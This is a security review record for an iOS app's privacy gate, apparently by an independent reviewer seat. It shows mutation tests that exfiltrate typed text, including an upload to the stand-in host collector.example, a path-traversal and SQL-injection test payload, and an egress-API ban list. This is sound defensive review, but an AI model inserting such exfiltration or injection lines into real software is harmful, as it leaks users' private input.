---
record_type: review
id: m15-closure-security-review
status: ratified
seat: independent
date: 2026-09-22
---
# M15 Stage 4.0 Security Review: the privacy promise is now on screen, and its gate is a word list

> **Independent seat.** I wrote none of this code. Policy was read from the protected base ref only:
> `git show 855b44a:subagent-profiles/Security-Reviewer.md`, `855b44a:docs/security-baseline.md`,
> `855b44a:AGENTS.md`, `855b44a:permission-matrix.md`, and D-126 / D-138 / D-141 in
> `855b44a:docs/decisions.md`. This record is the Stage 4.0 closure security review of M15. It
> also serves as the pulled-forward security pass that D-141 (ratified by the owner) requires for
> the HIGH wave W3.

## Verdict

**PASS WITH FINDINGS.** Nothing is BLOCKING. There is 1 MAJOR, 5 MINOR and 6 INFO.

No reader-typed text leaves the device on any path in the shipped code at `d8cd650`. I grepped
for every egress, storage and logging API listed under MAJOR-1 and found none outside the sanctioned
`EngineClient.swift`. D-138 holds: `Detail.swift` and `ContentView.swift` do no arithmetic on a
served score. The three new upstream boards are attributed and bounded. The scripts write nothing
to the real artifact. No `/v1` field was added or changed. Gitleaks and pip-audit are clean, and
there is no new third-party import.

The MAJOR is about the control, not the code. In M15-W2 the D-126 egress gate was rewritten and
described as a ban "on the INVARIANT". It is still a list of six substrings, and **10 of 12
privacy mutants survived every gate, `swift test` included**. The same milestone put the promise
"What you type stays on this device." in front of the reader. I recommend fixing it in W4, before
the first deploy of this UI. It is not BLOCKING, because no exploitable path ships today.

## 0. Surface and method

**Surface.** `git diff 855b44a d8cd650` covers three commits: `17e6554` (W1, board survey),
`93686df` (W2, detail screen and UI refresh) and `d8cd650` (W3, three surfaces and D-147 router
examples). That is 47 files, +3377/-139. Nothing is deployed.

**Method.**
- I read every changed line under `src/`, `scripts/`, `ios/ModelRanking/`, `tests/unit/`,
  `Makefile` and `.language-allow`.
- I ran the gates myself in my private worktree (detached at `d8cd650`):
  - Python suite: 951 passed, 12 skipped.
  - `swift test`: 257 tests, 0 failures. I ran it with an external `--scratch-path`, so it wrote
    nothing into the tree.
  - `gitleaks`, `pip-audit`, and `ruff --select S,BLE,PTH`.
- Every exploit ran against private copies of `advisor.db` under
  `<scratchpad>/secprobe/`, which is outside the tree.
- Every mutant was applied by a script. The script backs up the file, applies the change, runs
  the gates, restores the file and asserts it is byte-identical to the original.
- `git status --short` was empty after the mutants. The only change this seat leaves is this file.

## 1. Findings

### BLOCKING

None.

### MAJOR

**MAJOR-1: The D-126 egress gate is a substring denylist that misses most ways out of the device,
and it can blind itself.**
`tests/unit/test_router_hints.py:281` and `:289`. The user-facing promise is at
`ios/ModelRanking/Engine/Language.swift:397-401`, rendered at
`ios/ModelRanking/ContentView.swift:266`.

- **What the gate is.** `egress = ("URLSession", "URLRequest", "URL(string:", "NWConnection",
  "CFStream", "Network.")` is matched as substrings over every `*.swift` under
  `ios/ModelRanking`. Before matching, each line is cut at the first `//`.
- **What it misses.** Measured in §2 (M03–M11, M15). Each of these carries the reader's typed
  text off the device, or off the backup-excluded store, and passes all 46 client-gate tests.
  Where the mutated file is in the Engine target, it also passes all 257 Swift tests:
  - `URL.init(string:)`;
  - `URLComponents` with `UIApplication.shared.open`;
  - `WKWebView().loadHTMLString("<img src=…?q=\(typed)>")`, which needs no URL API at all and
    only an `import WebKit` the gate does not ban;
  - `UIPasteboard` (Universal Clipboard reaches the reader's other devices);
  - `NSUbiquitousKeyValueStore` (iCloud sync);
  - `UserDefaults` (included in device backup);
  - `NSLog`;
  - `Data(contentsOf:)` on a remote URL built with `URLComponents`, placed in `Router.swift`,
    which receives the raw question.
- **How it blinds itself.** Comment stripping is not string-aware. Any line containing a URL
  literal (`"https://…"`) hides everything after the `//` inside that literal. For example, in
  `Detail.swift`:

  ```swift
  let sink = "https://collector.example/q"; _ = URLSession.shared.uploadTask(...)
  ```

  This is a literal `URLSession` upload, and it passes (M06).
- **The backup exclusion (REQ-GAP-001).** Its only guard is the presence of the string
  `isExcludedFromBackup = true` (`test_router_hints.py:246`). Adding a following line
  `values.isExcludedFromBackup = false` uploads the gap register with the device backup and
  passes every gate (M10).
- **Scope gap.** The Xcode target is a `PBXFileSystemSynchronizedRootGroup` over `ModelRanking/`,
  so any `.m`, `.c` or `.mm` file dropped there is compiled. The gate reads only `*.swift`.
- **Failure scenario.** The next feature (share sheet, "open source page", analytics, a web view
  for a benchmark card) adds one of these calls. `make check` stays green, and the app breaks
  the promise it now prints under the question field. This is the fifth recurrence of one shape
  (W-090, M13 MINOR-4, W-099, W-110): a narrow list presented as an invariant. In M15 the promise
  became user-facing in the same milestone.
- **Why not BLOCKING.** I grepped `ios/ModelRanking` at `d8cd650` for `openURL`, `Link(`,
  `ShareLink`, `UIApplication`, `WKWebView`, `WebKit`, `SFSafari`, `UIPasteboard`, `Ubiquitous`,
  `CloudKit`, `UserDefaults`, `print(`, `NSLog`, `Logger`, `os_log`, `Data(contentsOf` and
  `URLComponents`. The only hits are sanctioned:
  - `@AppStorage("language")` (`ContentView.swift:53`), which holds the language choice, not
    text;
  - the gap-register file read (`FrontDoor.swift:306`);
  - `EngineClient.swift:194`.

  Nothing ships that is exploitable.
- **Remedy (all in the test file, no product change):**
  1. Invert the gate to an allowlist:
     - Each client file may `import` only `{Foundation, SwiftUI, NaturalLanguage,
       FoundationModels}`, and `EngineClient.swift` is the only file that may name a URL type.
     - Ban `URLComponents`, `URL.init`, `URL(`, `openURL`, `UIApplication`, `Link(`, `ShareLink`,
       `WebKit`/`WKWebView`/`SFSafari`, `UIPasteboard`, `NSUbiquitousKeyValueStore`, `CloudKit`,
       `UserDefaults` and `@AppStorage` other than `"language"`, `NSLog`/`Logger`/`os_log`/`print(`,
       and `Data(contentsOf:`/`String(contentsOf:` outside `GapRegisterStore`.
  2. Make comment stripping literal-aware. The repo already parses every Swift file with
     tree-sitter (`m15-wave-2-close.md` row 9); strip comment nodes rather than splitting on
     `//`.
  3. Scan every non-asset file under `ios/ModelRanking`, not just `*.swift`.
  4. Add a behavioural backup-exclusion test in `FrontDoorTests.swift`: after `save`, read back
     `resourceValues(forKeys: [.isExcludedFromBackupKey])` on the folder and the file. Also assert
     statically that `isExcludedFromBackup = false` never appears.
  5. Re-run M03–M11 and M15 from §2. Each one must die.

### MINOR

**MINOR-1: Upstream non-finite ratings are accepted. `Infinity` in a new board takes that surface
down while `/health` reports `servable`.** `src/app/clients/arena.py:360-372` (`parse_arena`).

- **What it checks.** `parse_arena` checks `isinstance(rating, int | float)`, not
  `math.isfinite`. Python's `json.loads` accepts the bare literals `NaN` and `Infinity`.
- **Measured behaviour:**
  - `parse_arena` returns `('evil', inf)`, `('nanm', nan)` and `('big', 1e308)`.
  - `NaN` is caught downstream. `NOT NULL` fails, `_store_scores` wraps that as a `SourceError`,
    and the board is rolled back (fail-closed, correct).
  - `Infinity` is stored.
- **Effect.** With one `arena_vision` row set to `inf` in a private artifact copy:
  - `/v1/recommendations?task=vision` returns **500** with the generic body (baseline item 6
    holds).
  - `coding`, `/v1/categories` and `/health` return 200, and `/health` reports `"evidence":
    "servable"`.
  - A finite `1e308` would be served as the leader.
- **Why it matters now.** This gap predates M15 (the parser is from M2). W3 routes three more
  boards through it, and each one is the *sole* evidence for its surface.
  `board_measurement._finite_score` already has the right shape.
- **Remedy.**
  - Skip, and count as skipped, any rating that is not `math.isfinite`, or outside a sane Elo
    band (for example 0–5000).
  - Add a negative test per board.
  - Consider whether `/health` should probe one ranked surface.

**MINOR-2: The new promise "What you type stays on this device." is stronger than the app can
guarantee.** `Language.swift:397-401`, `ContentView.swift:262-268`.

- The app code keeps the text local (verified above).
- The question field still accepts third-party keyboards with Full Access. There is no
  `application(_:shouldAllowExtensionPointIdentifier:)` refusing `.keyboard` anywhere under `ios/`.
- The system dictation button is also available.
- **Remedy.** Either:
  - refuse custom keyboards, which needs an app-delegate adaptor since the app is SwiftUI-only; or
  - word the line as a claim about this app ("This app never sends what you type").

**MINOR-3: The HIGH wave W3 was committed without its pulled-forward pass or a wave-close
record.** D-141, with `docs/plans/m15-plan.md` §2 tagging W3 HIGH.

- There is no `docs/plans/m15-wave-3-close.md` in the tree.
- `note.txt` records W3 as committed at `d8cd650`.
- D-141 says a HIGH wave "gets its pulled-forward security pass". This record discharges it only
  retroactively, at closure, after the commit.
- **Remedy.** The W4 closure report names this record as W3's row-4 evidence, and says that it
  landed after the commit rather than before.

**MINOR-4: The EngineClient exemption cites a test that does not exist.**
`tests/unit/test_router_hints.py:269` and `:280`, and `docs/reviews/m15-wave-2-review.md:307`.

- These cite `test_the_client_sends_only_the_surface_and_budget`. `grep` finds no such function
  anywhere.
- The real pins are:
  - `ios/EngineTests/EngineClientTests.swift:407` (`testTheSurfaceAndTheBudgetAreBothSentAndNothingElseIs`);
  - `ios/EngineTests/EngineClientTests.swift:414` (`testNothingTheReaderTypedIsEverSent`);
  - `test_router_hints.py:227`, which bans the word `question` in `EngineClient.swift`.
- This is the W-102 shape: the one exemption to the privacy gate is justified by a citation
  nobody can follow.
- **Remedy.** Cite the real tests.

**MINOR-5: Swift output goes to a fixed shared path.** `Makefile:155`.

- `echo "$$out" > /tmp/mr_swift_test.log` is a predictable path in a world-writable directory.
  That allows a symlink clobber by another local user, or a stale log read as the current run.
- The same pattern appears in the `scripts/router_probe/probe.swift:6-9` instructions
  (`/tmp/examples.json`, `/tmp/probe`).
- Low risk on a single-user Mac.
- **Remedy.** Use `mktemp`, or a gitignored path in the repo.

### INFO (verified, no action required unless stated)

- **I-1: The survey bypasses the client constructor, and the second guard holds.**
  `scripts/survey_boards.py:96` builds `ArenaClient.__new__(ArenaClient)` to read unregistered
  configs, which skips the REQ-SRC-011 refusal. That is acceptable, because `ingest_arena`
  independently refuses any source id no registered board claims (`src/app/workflows/ingest.py:162-168`).
  A survey client can therefore never reach the real artifact through ingest.
- **I-2: The scripts write only to throwaway copies. Verified by execution.** I ran
  `calibrate_board.main(["--config","vision",...])` and `survey_boards.main([... "--only","vision"])`
  with `ArenaClient.fetch_raw` patched to a hostile payload. The payload included a
  `model_name` of `../../etc/passwd\x1b[31mRED\x1b[0m'; DROP TABLE scores;--`.
  - The artifact's SHA-1 was unchanged (`bad969be…`), and so was its row count (2645).
  - The name was stored as data (parameterised SQL).
  - Control characters were escaped (`\u001b`) in both JSON outputs.
  - `calibrate_board --config` is restricted to `choices=sorted(ARENA_BOARDS)`.
  - The survey's `--only` goes through `httpx.URL(params=…)` encoding.
- **I-3: Attribution per board is complete and gated.**
  - `rank.py:58-60` names each new source explicitly, with no prefix rule.
  - `/v1/recommendations?task={vision,search,search_factuality}` each carry the Arena CC-BY-4.0
    line.
  - Mutant M16, which deletes one entry, is killed by
    `test_arena_client.py::test_every_registered_arena_board_is_attributed_and_floored`.
  - Licence: the three are configs of the same `lmarena-ai/leaderboard-dataset` under its single
    CC-BY-4.0 grant (`arena.py:48-52`). I did not re-fetch the dataset card (§5).
- **I-4: `/v1` is unchanged.**
  - `src/app/adapter/main.py` and `CategorySpec` are untouched.
  - The entry keys of `/v1/categories` and `/v1/recommendations` are the pre-M15 set: I checked
    them live, and they include no `min_quality`, in line with W-112.
  - The detail screen decodes only fields `Models.swift` already had; the diff there is two
    empty conformances.
  - The new ids (`vision`, `search`, `search_factuality`) are enum values, not fields.
  - `task` is validated against the catalogue: `task=../../etc` returns 400 `unknown_task`.
- **I-5: No policy-alteration attempt.**
  - `AGENTS.md`, `permission-matrix.md`, `docs/security-baseline.md`, `subagent-profiles/`,
    `.github/`, `.gitleaks.toml`, `pyproject.toml` and the Xcode project are untouched.
  - `docs/decisions.md` is append-only (D-147 only; no `-` lines).
  - `.language-allow` gains two by-name entries (`Detail.swift`, `DetailTests.swift`), each with
    a reason.
  - `SWIFT_TEST_FLOOR` was raised to 257, not lowered; it is escalated as W-111.
  - A regex scan of the diff for reviewer-directed instructions found none.
- **I-6: Notes for the owner, outside security scope.**
  - The held-out probe set is not held out: `scripts/router_probe/heldout_questions.json:23`
    ("which model has the lowest latency") is verbatim `Router.swift:131`, a decline example.
    That contradicts D-147 point 5.
  - D-144's per-source carry-forward, planned for W3, is not in `src/`. The three new
    sole-evidence boards therefore go dark on any single upstream outage.
  - `scripts/router_probe/probe.swift` is outside every shipped target (the synchronized group is
    `ModelRanking/`, and the package target is `ModelRanking/Engine`), so its `try!`/`!` crashes
    affect only the developer.

## 2. Mutant table

"Gates" means:
- the 46 client-contract tests in `test_router_hints.py`, `test_ios_client_contract.py`,
  `test_ios_visual_contract.py` and `test_uncertainty_contract.py`;
- plus `swift test` (257) where marked.

The baseline was green: 46 passed, and Swift 257/0. Every mutant was reverted and byte-compared.

| ID | Mutant (file) | Invariant | Result | Killed by / note |
|---|---|---|---|---|
| M01 | `URLSession.shared.dataTask` in `detailFacts` (`Detail.swift`) | D-126 | **KILLED** | `test_the_gap_register_stays_on_the_device` (W-110 fix holds) |
| M02 | `URL(string: "https:…?q=" + typed)` after `gaps.record` (`ContentView.swift`) | D-126 | **KILLED** | same |
| M03 | `URL.init(string: …typed)` and `UIApplication.shared.open` (`ContentView.swift`) | D-126 | **SURVIVED** | MAJOR-1 (spelling) |
| M04 | `URLComponents` + `URLQueryItem(value: typed)` + `UIApplication.shared.open` (`ContentView.swift`) | D-126 | **SURVIVED** | MAJOR-1 |
| M05 | `WKWebView().loadHTMLString("<img src=…" + typed …)` (`ContentView.swift`) | D-126 | **SURVIVED** | MAJOR-1; `import WebKit` is also unbanned |
| M06 | `let sink = "https://…"; _ = URLSession.shared.uploadTask(…)` on one line (`Detail.swift`) | D-126 | **SURVIVED** (and Swift 257/0) | MAJOR-1: the gate's own `//` split hides the call |
| M07 | `UIPasteboard.general.string = typed` (`ContentView.swift`) | D-126 | **SURVIVED** | MAJOR-1 |
| M08 | `NSUbiquitousKeyValueStore.default.set(typed, …)` (`ContentView.swift`) | D-126 | **SURVIVED** | MAJOR-1 |
| M09 | `UserDefaults.standard.set(typed, …)` (`ContentView.swift`) | D-126 / backup | **SURVIVED** | MAJOR-1 |
| M10 | `values.isExcludedFromBackup = false` after the `= true` line (`FrontDoor.swift`) | REQ-GAP-001 | **SURVIVED** (and Swift 257/0) | MAJOR-1: presence-of-string check only |
| M11 | `NSLog("asked: %@", typed)` (`ContentView.swift`) | D-126 (logs) | **SURVIVED** | MAJOR-1 |
| M12 | `model.score * 1.1` rendered as a fact (`Detail.swift`) | D-138 | **KILLED** | `test_score_arithmetic_happens_only_where_an_adr_permits_it`, `test_the_client_performs_no_arithmetic_on_a_number_the_engine_sent` |
| M13 | `let measured = model.score; measured * 1.1` (`Detail.swift`) | D-138 | SURVIVED | Known and documented: REQ-APP-005 stays PARTIAL for laundering through a renamed binding (test docstring). Not a new finding |
| M14 | `pick.score * 1.1` in `PickRow` (`ContentView.swift`) | D-138 | **KILLED** | 3 tests, including `test_every_score_on_screen_goes_through_the_figures_line` |
| M15 | `Data(contentsOf: URLComponents(…).url!.appending(queryItems: [q: text]))` in `SimilarityRouter.route` (`Router.swift`) | D-126 | **SURVIVED** (and Swift 257/0) | MAJOR-1: the router holds the raw question |
| M16 | Drop `"arena_search_factuality": ARENA_ATTRIBUTION` (`rank.py`) | CC-BY attribution | **KILLED** | `test_every_registered_arena_board_is_attributed_and_floored` |
| P1 | Data probe: `rating: Infinity` in one `arena_vision` row (artifact copy) | untrusted input | not caught | MINOR-1: `/v1/recommendations?task=vision` returns 500, `/health` says `servable` |
| P2 | Data probe: `rating: NaN` through `parse_arena` and `_store_scores` | untrusted input | caught | `SourceError` (NOT NULL), board rolled back |

**Score:** D-126 and gap-register privacy mutants: 2 of 12 killed (M01, M02; M03–M11 and M15 survived). D-138: 2 of 3 killed,
and the survivor is a documented PARTIAL. Attribution: 1 of 1 killed.

## 3. Security baseline walk (`855b44a:docs/security-baseline.md`)

| Item | Status | Evidence |
|---|---|---|
| V3C-11: no plaintext creds / default admin | PASS | `gitleaks detect --no-git` (5.84 MB, no leaks) and `--log-opts=855b44a..d8cd650` (3 commits, no leaks); keyword grep over the diff shows only "per-token" prose |
| V3C-12: authz on mutating routes | N/A, unchanged | `src/app/adapter/` is not in the diff; no route was added |
| V3C-13: CORS allowlist | unchanged | `MODEL_RANKING_CORS_ORIGINS` handling is not in the diff |
| V3C-51: fail-closed startup config | PASS (observed) | The adapter refused to import without `APP_BUILD` (`ConfigError … (L.7)`) until I set `APP_ENV=test` |
| V3C-56: PII at rest | unchanged | `FrontDoor.swift` is not in the diff; the gap register keeps `.completeFileProtection` and folder-level backup exclusion. The guard's weakness is in MAJOR-1/M10 |
| Generic client errors | PASS | The 500 under P1 returned `{"code":"internal_error","message":"The request could not be served."}` |
| Dependencies | PASS | No new third-party import. New Python imports are stdlib (`shutil`, `tempfile`) or in-repo; new Swift imports are none (`Design.swift` uses SwiftUI). `pyproject.toml` is unchanged. `pip-audit`: no known vulnerabilities |
| SAST | PASS | `ruff --select S,BLE,PTH` on every changed Python file: 0 `S` findings; 2 `BLE001` in `survey_boards.py:255,316`, which are deliberate and commented. `ruff check src tests scripts` (0.16.2): clean |
| V3C-73: built is not wired | see MAJOR-1 | The D-126 control is wired but does not cover the invariant it names |

## 4. D-141: did W3 need a security pass?

**Yes. The pass found things in W3's own slice that it is shaped to find.**

- W3 added three upstream ingestion paths. Each is the sole evidence for a reader-facing surface,
  and W3 went unreviewed for untrusted numeric input: MINOR-1, a surface-level denial of service
  from one upstream row.
- W3 rewrote `Router.swift`, the one Engine file that holds the reader's raw question. M15 shows
  that an egress call placed there passes every gate.
- The biggest finding (MAJOR-1) was born in W2 (tagged MED; its pass waived under W-106). It
  became user-facing in the W2 UI refresh, and W3 extended the code it fails to guard.

This pass found one MINOR and part of a MAJOR in the HIGH wave's own slice. D-141's
"revisit when … finds nothing for three consecutive milestones" is not met.

## 5. What I verified, and what I did not

**Verified by running:**
- the full Python suite (951/12);
- `swift test` (257/0), at baseline and under M06, M10 and M15;
- all 16 code mutants and 2 data probes above;
- live `/v1` payloads for the three new surfaces through `TestClient` against the real artifact
  (read-only) and against private copies;
- the calibrate and survey scripts under a hostile payload, with artifact hash comparison;
- gitleaks (tree and commit range), pip-audit and ruff.

**Verified by reading:**
- every changed line of `Detail.swift`, `ContentView.swift`, `Design.swift`, `Router.swift`,
  `Models.swift`, `arena.py`, `categories.py`, `sources.py`, `rank.py`,
  `survey_boards.py`, `calibrate_board.py`, `router_probe/*`, `Makefile`, `.language-allow` and
  the four changed test files;
- the ingest and build error paths that decide fail-open or fail-closed for a bad board.

**Not checked:**
- **The Xcode build and a simulator run.** I did not build the app target, so M03–M05, M07–M09
  and M11 (all in `ContentView.swift`) were not compiled. They use standard iOS APIs (M05 would
  also need `import WebKit`, which is unbanned). The statement that they would build is my
  inference.
- **Network behaviour on a device.** This includes whether iOS dictation or keyboard extensions
  actually transmit (MINOR-2 is by API reasoning, not traffic capture).
- **The live Hugging Face dataset card.** I did not fetch it to reconfirm per-config licensing.
- **The live upstream.** I did not run the survey or calibrate scripts against it.
- **The owner's working tree.** I did not touch it, by instruction.
- **The router's behaviour or accuracy** (D-147 probe numbers), except the held-out overlap in I-6.
